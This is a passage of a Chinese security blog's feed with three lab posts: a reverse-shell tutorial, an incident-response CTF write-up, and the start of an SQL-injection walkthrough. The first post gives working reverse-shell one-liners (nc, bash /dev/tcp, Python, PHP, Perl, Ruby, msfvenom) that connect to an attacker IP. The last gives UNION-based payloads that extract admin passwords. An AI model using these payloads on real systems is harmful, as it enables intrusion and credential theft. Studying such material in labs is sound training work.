  </entry>
  
  <entry>
    <title>反弹 shell </title>
    <link href="https://s1ient.github.io/post/f09cf188.html"/>
    <id>https://s1ient.github.io/post/f09cf188.html</id>
    <published>2023-03-16T12:55:44.000Z</published>
    <updated>2023-05-10T05:57:59.650Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><h2 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h2><p>反弹 shell，就是攻击机监听在某个 TCP&#x2F;UDP 端口为服务端，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>让对方目标机器主动连接攻击者机器（攻击者指定服务端，受害者主机主动连接攻击者的服务端程序）</p><blockquote><ol><li>攻击者 A 开启 2333 端口 TCP&#x2F;UDP 服务</li><li>受害者 B 连接 2333 端口 TCP&#x2F;UDP 服务</li><li>A、B 建立 TCP&#x2F;UDP 连接</li><li>A 通过 TCP&#x2F;UDP 服务将待执行命令发送到 B</li><li>B 执行命令后将结果发送给 A</li></ol></blockquote><h1 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h1><p>环境</p><blockquote><p>win11  192.168.3.155</p><p>kali  192.168.6.128</p></blockquote><p><a href="https://blog.csdn.net/muriyue6/article/details/107127217">Windows 安装 netcat</a></p><p>kali 打开终端输入 <code>ip add</code></p><p><img src="/../image/%E5%8F%8D%E5%BC%B9-shell/1.png" alt="1"></p><p>win11 打开终端，输入 <code>ipcongif/all</code></p><p><img src="/../image/%E5%8F%8D%E5%BC%B9-shell/2.png" alt="2"></p><h2 id="linux-下反弹-shell"><a href="#linux-下反弹-shell" class="headerlink" title="linux 下反弹 shell"></a>linux 下反弹 shell</h2><h3 id="netcat-反弹-shell"><a href="#netcat-反弹-shell" class="headerlink" title="netcat 反弹 shell"></a>netcat 反弹 shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># win11  监听 2518 这个端口</span></span><br><span class="line"><span class="comment"># -l: 使用监听模式，管理和控制传入的数据</span></span><br><span class="line"><span class="comment"># -v: 详细输出</span></span><br><span class="line"><span class="comment"># -p&lt;通信端口&gt;: 设置本机使用的通信端口</span></span><br><span class="line">nc -lvvp 2518</span><br><span class="line"></span><br><span class="line"><span class="comment"># kali   -e 程序重定向</span></span><br><span class="line">nc 192.168.3.155 2518 -e /bin/bash</span><br></pre></td></tr></table></figure><p>这里我输错了好几次。。。</p><p>先 win11 输入命令，再到 kali 输入命令，可以看到 win11 出现了 <code>connect to</code> 字样，这个时候我们就可以在 win11 里面输入 <code>whoami</code> 以及 <code>ls</code> 等命令来获取目标机(kali)的信息了</p><p><img src="/../image/%E5%8F%8D%E5%BC%B9-shell/3.png" alt="3"></p><p>但是这个方法要求两边都安装 netcat，但若是目标机没有安装 netcat，那么这个方法就行不通</p><h3 id="bash-反弹-shell"><a href="#bash-反弹-shell" class="headerlink" title="bash 反弹 shell"></a>bash 反弹 shell</h3><p>使用 bash 结合重定向方法的一句话，具体命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bash -i &gt;&amp; /dev/tcp/攻击机IP/攻击机端口 0&gt;&amp;1</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.3.155/2518 0&gt;&amp;1</span><br><span class="line">或</span><br><span class="line">bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.3.155/2518 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure><p>以下是针对Bash反弹一句话进行了拆分说明：</p><table><thead><tr><th align="left">命令</th><th align="left">命令详解</th></tr></thead><tbody><tr><td align="left">bash -i</td><td align="left">产生一个 bash 交互环境。</td></tr><tr><td align="left">&gt;&amp;</td><td align="left">将联合符号前面的内容与后面相结合，然后一起重定向给后者。</td></tr><tr><td align="left">&#x2F;dev&#x2F;tcp&#x2F;192.168.3.155&#x2F;2518</td><td align="left">Linux 环境中所有的内容都是以文件的形式存在的，就是让目标主机与攻击机 192.168.3.155 的 2518 端口建立一个tcp连接。</td></tr><tr><td align="left">0&gt;&amp;1</td><td align="left">将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。</td></tr></tbody></table><p>按道理这个是可以的，我在很多文章都看到了这个方法，但是我一直显示没有那个目录，一脸懵逼…</p><h2 id="脚本反弹-shell"><a href="#脚本反弹-shell" class="headerlink" title="脚本反弹 shell"></a>脚本反弹 shell</h2><h3 id="python-反弹-shell"><a href="#python-反弹-shell" class="headerlink" title="python 反弹 shell"></a>python 反弹 shell</h3><p>当目标主机上有 python 环境时，我们可以用 Python 来反弹 shell。</p><p><strong>攻击机（win 11）监听 2518 端口</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2518</span><br></pre></td></tr></table></figure><p><strong>目标机（kali）执行下列命令</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.3.155&quot;,2518));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/%E5%8F%8D%E5%BC%B9-shell/4.png" alt="4"></p><h3 id="php-脚本反弹-shell"><a href="#php-脚本反弹-shell" class="headerlink" title="php 脚本反弹 shell"></a>php 脚本反弹 shell</h3><p><strong>攻击机（win 11）监听 2518 端口</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2518</span><br></pre></td></tr></table></figure><p><strong>目标机（kali）执行下列命令</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;192.168.3.155&quot;,2518);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/%E5%8F%8D%E5%BC%B9-shell/5.png" alt="5"></p><h3 id="Perl-脚本反弹shell"><a href="#Perl-脚本反弹shell" class="headerlink" title="Perl 脚本反弹shell"></a><strong>Perl 脚本反弹shell</strong></h3><p>当目标主机上有perl环境时，我们可以用perl来反弹shell。</p><p><strong>攻击机开启本地监听：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp <span class="number">2518</span></span><br></pre></td></tr></table></figure><p><strong>目标机主动连接攻击机：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;192.168.3.155&quot;;$p=2518;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure><p>执行效果如下：</p><p><img src="/../image/%E5%8F%8D%E5%BC%B9-shell/6.png" alt="6"></p><h3 id="Ruby脚本反弹shell"><a href="#Ruby脚本反弹shell" class="headerlink" title="Ruby脚本反弹shell"></a><strong>Ruby脚本反弹shell</strong></h3><p>当目标主机上有 ruby 环境时，我们可以用 ruby 来反弹 shell。</p><p><strong>攻击机开启本地监听：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp <span class="number">2518</span></span><br></pre></td></tr></table></figure><p><strong>目标机主动连接攻击机：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">&#x27;c=TCPSocket.new(&quot;192.168.3.155&quot;,&quot;2518&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br><span class="line">或</span><br><span class="line">ruby -rsocket -e <span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;192.168.3.155&quot;,&quot;2518&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br></pre></td></tr></table></figure><p>执行效果如下：</p><p><img src="/../image/%E5%8F%8D%E5%BC%B9-shell/7.png" alt="7"></p><h2 id="使用-Metasploit-生成反弹-shell-用的一句话"><a href="#使用-Metasploit-生成反弹-shell-用的一句话" class="headerlink" title="使用 Metasploit 生成反弹 shell 用的一句话"></a><strong>使用 Metasploit 生成反弹 shell 用的一句话</strong></h2><p>强大的 Metasploit 框架也为我们提供了生成一句话反弹 shell 的工具，即 <code>msfvenom</code>，绝对的实用。当我们不记得前面说的所有反弹 shell 的反弹语句时，只要我们有 Metasploit，那么我们随时都可以使用 <code>msfvenom -l</code> 来查询生成我们所需要的各类命令行一句话，具体使用方法如下。</p><p>我们直接可以使用 <code>msfvenom -l</code> 结合关键字过滤（如cmd&#x2F;unix&#x2F;reverse），列出我们需要生成的各类反弹 shell 一句话的 payload 的路径</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payloads | grep <span class="string">&#x27;cmd/unix/reverse&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/%E5%8F%8D%E5%BC%B9-shell/8.png" alt="8"></p><p>如上图所示，metasploit 支持生成反弹 shell 一句话的类型非常丰富，大家可以依据渗透测试对象自行选择使用。</p><p>比如，我们获取一个 python 反弹 shell 的一句话：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p <span class="built_in">cmd</span>/unix/reverse_python LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">155</span> LPORT=<span class="number">2518</span> -f raw</span><br></pre></td></tr></table></figure><p>而且他还对我们的一句话进行了编码</p><p><img src="/../image/%E5%8F%8D%E5%BC%B9-shell/9.png" alt="9"></p><p>测试一下，一样可以连接</p><p><img src="/../image/%E5%8F%8D%E5%BC%B9-shell/10.png" alt="10"></p><p>想要获取其他脚本的一句话 shell，最开始给了路径，只需要修改 -p 后面的参数就行了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash lhost=192.168.3.155 lport=2518 -f raw     <span class="comment"># bash 反弹一句话</span></span><br><span class="line">msfvenom -p cmd/unix/reverse_netcat lhost=192.168.3.155 lport=2518 -f raw     <span class="comment"># nc 反弹一句话</span></span><br><span class="line">msfvenom -p cmd/unix/reverse_python lhost=192.168.3.155 lport=2518 -f raw   <span class="comment"># python 反弹一句话</span></span><br><span class="line">msfvenom -p cmd/unix/reverse_perl lhost=192.168.3.155 lport=2518 -f raw     <span class="comment"># perl 反弹一句话</span></span><br><span class="line">msfvenom -p cmd/unix/reverse_ruby lhost=192.168.3.155 lport=2518 -f raw     <span class="comment"># ruby 反弹一句话</span></span><br></pre></td></tr></table></figure><h2 id="反弹-shell-后获取模拟终端"><a href="#反弹-shell-后获取模拟终端" class="headerlink" title="反弹 shell 后获取模拟终端"></a><strong>反弹 shell 后获取模拟终端</strong></h2><p>其实，上面所讲的各种方法获取的 shell 都不是一个标准的虚拟终端环境，它仅仅是一个标准输入。</p><p>你会发现存在一个问题，就是即使我们获取了目标虚拟终端控制权限，但是往往会发现其交互性非常的差，回显信息与可交互性非常的差和不稳定，具体见情况有以下几个种。</p><blockquote><p>•获取的虚拟终端没有交互性，我们想给添加的账号设置密码或执行 sudo 等命令，无法完成。</p><p>•标准的错误输出无法显示，无法正常使用 vim 等文本编辑器等。</p><p>•获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。</p></blockquote><p>这往往都是因为我们获取的 shell 并不是标准的虚拟终端，为了能够完成输入密码等操作，我们必须模拟一个真正的终端设备。</p><p>我们其实可以借助于 python 默认包含的一个 pty 标准库来获取一个标准的虚拟终端环境。</p><p>我们只需在获取的 shell 里面输入如下命令，即可模拟一个终端设备：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><p>对比前后，是不是后面一种看起来舒服多了，只是我这里有点乱吗，编码没有设置好…</p><p><img src="/../image/%E5%8F%8D%E5%BC%B9-shell/11.png" alt="11"></p><p>怎么解决这个乱码问题呢？</p><p>win 11 输入下列命令后再去 nc 就不会乱码了！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chcp 65001</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;</summary>
    
    
    
    
    <category term="web" scheme="https://s1ient.github.io/tags/web/"/>
    
    <category term="渗透测试" scheme="https://s1ient.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>应急加固</title>
    <link href="https://s1ient.github.io/post/379f1d7e.html"/>
    <id>https://s1ient.github.io/post/379f1d7e.html</id>
    <published>2023-03-15T11:53:04.000Z</published>
    <updated>2023-05-10T05:57:59.651Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/../image/%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA/1.png" alt="1"></p><p>一共 10 题</p><p>[TOC]</p><h1 id="1-js-劫持"><a href="#1-js-劫持" class="headerlink" title="1.js 劫持"></a>1.js 劫持</h1><p>首先进入网站先跳出了个二手市场，但是 1s 后立马变为了另一个博客界面</p><p><img src="/../image/%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA/2.png" alt="2"></p><p>所以第一题的 flag 就是博客的 url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.194nb.com</span><br></pre></td></tr></table></figure><h1 id="2-黑客首次的-webshell-密码"><a href="#2-黑客首次的-webshell-密码" class="headerlink" title="2.黑客首次的 webshell 密码"></a>2.黑客首次的 webshell 密码</h1><p>kali 里面通过 ssh 连接远程服务器，输密码的时候密码不会显示</p><p><img src="/../image/%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA/3.png" alt="3"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name *.php -<span class="built_in">print</span></span><br></pre></td></tr></table></figure><p>webshell 就是一个 asp 或 php 木马后门，所以先找 php 文件</p><p>发现一个名字奇怪的 php</p><p><img src="/../image/%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA/4.png" alt="4"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/www/html/public/Uploads/6127418cad73c.php</span><br></pre></td></tr></table></figure><p><img src="/../image/%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA/5.png" alt="5"></p><p>得到密码：<code>QjsvWsp6L84Vl9dRTTytVyn5xNr1</code></p><h1 id="3-黑客首次入侵的方式"><a href="#3-黑客首次入侵的方式" class="headerlink" title="3.黑客首次入侵的方式"></a>3.黑客首次入侵的方式</h1><blockquote><p>黑客首次攻击（非有效攻击）通过什么方式</p></blockquote><p>上一题看到一句话木马还以为是 文件上传，但是答案不是，又一看题目描述，非有效攻击 应该是攻击失败了</p><p>查看 80 端口进程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lsof -i:80</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">lsof 是 List Open File 的缩写, 它主要用来获取被进程打开文件的信息，在 Linux 中，一切皆文件，lsof 命令可以查看所有已经打开了的文件，比如: 普通文件，目录，特殊的块文件，管道，socket 套接字，设备，Unix 域套接字等等</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 lsof -i:端口号 可以获得所有在指定端口号上打开的文件</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">80端口，是被用于 WWW 代理服务的，可以实现网页浏览，经常在访问某个网站或使用代理服务器的时候会出现“:80”端口号</span></span><br></pre></td></tr></table></figure><p>发现是 <code>nginx</code></p><p><img src="/../image/%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA/6.png" alt="6"></p><p>找到 nginx 的日志文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/log/nginx</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cat</span> access.php</span><br></pre></td></tr></table></figure><p>alert 是 xss 攻击</p><p><img src="/../image/%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA/7.png" alt="7"></p><h1 id="4-黑客服务器的信息"><a href="#4-黑客服务器的信息" class="headerlink" title="4.黑客服务器的信息"></a>4.黑客服务器的信息</h1><blockquote><p>请找到黑客留下的后门中黑客服务器的 ip 及端口 </p></blockquote><p>查看进程                                  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ps aux</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ps a 显示现行终端机下的所有程序，包括其他用户的程序。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ps u 以用户为主的格式来显示程序状况。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ps x 显示所有程序，不以终端机来区分。</span></span><br></pre></td></tr></table></figure><p><img src="/../image/%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA/8.png" alt="8"></p><p>发现可疑的 1.sh 脚本，cat 得到 ip 和端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/www/html/runtime/cache/1.sh</span><br></pre></td></tr></table></figure><p><img src="/../image/%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA/9.png" alt="9"></p><h1 id="5-黑客的-webshell2"><a href="#5-黑客的-webshell2" class="headerlink" title="5.黑客的 webshell2"></a>5.黑客的 webshell2</h1><blockquote><p>提交黑客上传的第二个webshell内的flag </p></blockquote><p>这一题看的 wp ，用到了 <a href="https://www.sec-in.com/outLinkPage/?target=https://security.tencent.com/index.php/opensource/detail/15">腾讯安全应急响应中心实验室提供的web日志取证分析工具</a>   </p><p>但是我们也要把这个工具利用 <code>rsync</code>上传到远程服务器                       </p><p><img src="/../image/%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA/10.png" alt="10"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./LogForensics.pl -file access.log -websvr nginx</span><br><span class="line"><span class="built_in">cat</span> access.log.db</span><br></pre></td></tr></table></figure><p>看到可疑文件</p><p><img src="/../image/%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA/11.png" alt="11"></p><p>进入目录查看文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html/public/static/img</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cat</span> 1.php</span><br></pre></td></tr></table></figure><p><img src="/../image/%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA/12.png" alt="12"></p><h1 id="6-mysql"><a href="#6-mysql" class="headerlink" title="6.mysql"></a>6.mysql</h1><blockquote><p>修复 mysql 可 getshell 漏洞 </p></blockquote><p>也就是修复文件上传的功能，我们需要修改文件上传的权限</p><p>首先我们要得到 mysql 的账号和密码,这个在 <code>/var/www/html/application/database.php</code>里面</p><p><img src="/../image/%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA/13.png" alt="13"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">123456</span><br><span class="line">revoke file on *.* from <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span>; <span class="comment"># revoke 收回文件上传权限</span></span><br><span class="line"><span class="built_in">set</span> global general_log = off; <span class="comment"># 关闭日志功能</span></span><br><span class="line">flush privileges; <span class="comment"># 在不重启 mysql 下更新权限</span></span><br></pre></td></tr></table></figure><p><img src="/../image/%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA/14.png" alt="14"></p><p>回到题目点击 check 即可</p><h1 id="7-黑客的账号"><a href="#7-黑客的账号" class="headerlink" title="7.黑客的账号"></a>7.黑客的账号</h1><blockquote><p>找到黑客添加的账号并删除 </p></blockquote><p>直接看 <code>/etc/passwd</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd             </span><br></pre></td></tr></table></figure><p><img src="/../image/%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA/15.png" alt="15">  </p><p>移除 aman 这个账号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">userdel -rf aman</span><br></pre></td></tr></table></figure><p><img src="/../image/%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA/16.png" alt="16"></p><h1 id="8-黑客篡改的命令1"><a href="#8-黑客篡改的命令1" class="headerlink" title="8.黑客篡改的命令1"></a>8.黑客篡改的命令1</h1><blockquote><p>修复黑客篡改的命令并且删除篡改命令生成的免杀马 </p></blockquote><p>既然是命令，进入 <code>/bin</code> 目录下查找  </p><p>删除 ls 和 ps，并且把正版的 ls2 和 ps_ 恢复，并且把冒牌货 ls 中用 echo 写入的“不死马”删除                               </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> ps ps.bak</span><br><span class="line"><span class="built_in">mv</span> ps_ ps</span><br><span class="line"><span class="built_in">mv</span> <span class="built_in">ls</span> ls.bak</span><br><span class="line"><span class="built_in">mv</span> ls2 <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">rm</span> /var/www/html/public/statichttps://sec-in.com/img/1.php</span><br></pre></td></tr></table></figure><h1 id="9-黑客篡改的命令2"><a href="#9-黑客篡改的命令2" class="headerlink" title="9.黑客篡改的命令2"></a>9.黑客篡改的命令2</h1><p>写了第 8 题这题直接 check 即可</p><h1 id="10-修复-js-劫持"><a href="#10-修复-js-劫持" class="headerlink" title="10.修复 js 劫持"></a>10.修复 js 劫持</h1><p>写到这里是环境到期了，所以这题其实我并没有写出来，直接看的 wp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html</span><br><span class="line">find . | xargs grep -ri <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;&#x27;</span> -l | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c</span><br></pre></td></tr></table></figure><p><img src="/../image/%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA/17.png" alt="17"></p><p>找到了文件路径，把 js.html 里的最后一个 script 删除即可</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>头一次写这种题目，很新颖，所以一开始很长的时间都浪费在了怎么连接服务器上，每个 wp 里面也没有写，开始按照一些人说的用 windows 的 mstsc 连接，还有 ftp，向日葵，xshell……但是都不行。后面才找到可以用 <code>ssh</code>连接，不然的话时间完全够。</p><p>要对 linux 目录比较熟悉，例如 mysql 所在的 <code>/var/www/html/appcation</code>，账号所在的目录 <code>/etc/passwd</code>，命令所在的 <code>/bin</code> 等等</p><p>还有就是 linux 命令也要晓得，例如<code> ssh</code>，这个我晓得但是没怎么用过不熟悉，这还是第一次用，以及本地文件上传到远程服务器的 <code>rsync</code>，删除账号的 <code>userdel</code>，以及查看进程的 <code>ps</code> 和 <code>lsof</code> 等等</p><p>也了解到了一个 web 日志查看工具 <code>LogForensics</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/../image/%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA/1.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;p&gt;一共 10 题&lt;/p&gt;
&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;1-js-劫持&quot;&gt;&lt;a href=&quot;#1-js-</summary>
      
    
    
    
    
    <category term="web" scheme="https://s1ient.github.io/tags/web/"/>
    
    <category term="应急加固" scheme="https://s1ient.github.io/tags/%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA/"/>
    
  </entry>
  
  <entry>
    <title>尤里的复仇</title>
    <link href="https://s1ient.github.io/post/fe6f190b.html"/>
    <id>https://s1ient.github.io/post/fe6f190b.html</id>
    <published>2023-03-14T05:28:12.000Z</published>
    <updated>2023-05-10T05:57:59.654Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="第一章：为了女神小芳！"><a href="#第一章：为了女神小芳！" class="headerlink" title="第一章：为了女神小芳！"></a>第一章：为了女神小芳！</h1><blockquote><p>tips:</p><p>​       通过 sql 注入拿到管理员密码！</p></blockquote><p>进去有一个新闻链接，点进去发现 <code>url</code> 栏出现了 <code>id=1</code>，可能有 sql 注入漏洞</p><p>测试一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=1</span><br><span class="line">?id=1 and 1=2</span><br></pre></td></tr></table></figure><p>存在 sql 注入漏洞，且得出字段数为 2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 order by 2</span><br></pre></td></tr></table></figure><p>判断回显点，界面出现 222 说明第二个参数是回显点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=2 union select 111,222</span><br></pre></td></tr></table></figure><p>求表名,得到 <code>admin,dirs,news,xss</code>四个表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=2 union select 111,group_concat(table_name) from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure><p>求字段名,得到 <code>id,username,password</code>三个字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=2 union select 111,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;admin&#x27;</span><br></pre></td></tr></table></figure><p>先查看账户得到管理员的帐号，再查看密码得到管理员密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=2 union select 111,group_concat(username) from admin</span><br><span class="line">?id=1 and 1=2 union select 111,group_concat(password) from admin</span><br></pre></td></tr></table></figure><h1 id="第二章：遇到阻难！绕过WAF过滤"><a href="#第二章：遇到阻难！绕过WAF过滤" class="headerlink" title="第二章：遇到阻难！绕过WAF过滤"></a>第二章：遇到阻难！绕过WAF过滤</h1><blockquote><p>尤里在得到女神家网站密码后，却发现注入点权限很小，凭他的皮毛技术也没找到网站后台，<br>这时尤里通过旁站查询，他发现了女神家网站是用的主机空间托管，<br>他立刻扫描旁站，果然发现一个站点，且后台是默认路径……<br>尤里冷笑一声行动了起来，却发现有一层防火墙拦在了他的面前。。</p></blockquote><p>进去是一个新闻界面，随便点一个新闻进去，观察 url 栏，可能存在 sql 注入，开始想尝试 <code>and 1=1</code>进行判断的，没想到出发了 waf</p><p>过滤了这些字符.</p><p><img src="/../image/%E5%B0%A4%E9%87%8C%E7%9A%84%E5%A4%8D%E4%BB%87/2-1.png" alt="2-1"></p><p>那我们也没有必要进行判断了，直接 